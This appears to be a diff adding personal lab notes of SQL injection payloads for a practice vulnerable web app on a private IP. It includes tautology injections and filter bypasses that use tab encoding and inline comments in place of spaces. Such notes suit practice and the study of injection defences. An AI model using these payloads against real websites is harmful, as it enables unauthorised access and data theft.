@@ -1,0 +1,19 @@
+example1:
+http://192.168.56.101/sqli/example1.php?name=root' or '1'='1
+or
+http://192.168.56.101/sqli/example1.php?name=root' or 1=1 %23
+
+example2:
+http://192.168.56.101/sqli/example2.php?name=root'%09or%09'1'='1
+http://192.168.56.101/sqli/example2.php?name=root'%09or%091=1%23
+
+example3:
+http://192.168.56.101/sqli/example2.php?name=root'/**/or/**/'1'='1
+or
+http://192.168.56.101/sqli/example2.php?name=root'/**/or/**/1=1%23
+or
+same as example2
+
+example4:
+http://192.168.56.101/sqli/example4.php?id=2 or 1=1
+
